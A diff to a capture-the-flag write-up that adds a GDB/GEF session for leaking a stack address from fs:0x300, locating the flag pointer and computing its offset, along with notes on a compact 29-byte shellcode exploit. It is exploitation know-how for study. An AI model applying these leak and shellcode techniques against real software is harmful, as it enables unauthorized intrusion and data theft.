@@ -397,6 +397,31 @@ If `write` were the only option, or if the memory was `r--` (`stat` would fail t
 
 ### Leak Stack Alternative (portable and consistent) `exploit4.py`
 
+Get stack leak from `fs:0x300`, then use the offset to the flag pointer; use GDB/GEF to figure it out:
+
+```
+gef➤  p/x $fs_base+0x300
+$1 = 0x7f09746e7840
+gef➤  p/x {long}$1
+$2 = 0x7ffef1759330
+gef➤  grep CTF{
+[+] Searching 'CTF{' in memory
+[+] In (0x613efdd5000-0x613efdd6000), permission=rw-
+  0x613efdd5000 - 0x613efdd500b  →   "CTF{flag}\n"
+gef➤  vmmap stack
+Start              End                Offset             Perm Path
+0x00007ffef173a000 0x00007ffef175b000 0x0000000000000000 rwx [stack]
+gef➤  find 0x00007ffef173a000, 0x00007ffef175afff, 0x613efdd5000
+0x7ffef1759040
+0x7ffef1759048
+0x7ffef17591c8
+3 patterns found.
+gef➤  p/x {long}$1 - 0x7ffef1759040
+$2 = 0x2f0
+```
+
+#### Exploit 4
+
 ```python
 #!/usr/bin/env python3
 
@@ -432,15 +457,11 @@ p.close()
 print(_)
 ```
 
-Get a stack leak from `fs:0x300`, then use the offset to the flag pointer (use GDB to figure it out).
-
 > No need to match libc versions.
-> 
-> I didn't try this approach at first since I knew exactly what would work (dump 16 predictable `rand()` locations).
 > 
 > _`write` out FD `0`?!_  Yeah, you can do that (remotely, locally you'd want to run binary with `socat`).
 > 
-> `rax` and `rdx` were cleared before shellcode run; use `dl` and `al` to reduce payload.
+> `rax` and `rdx` were reset before shellcode run; use `dl` and `al` to reduce payload.
 
 29 bytes:
 
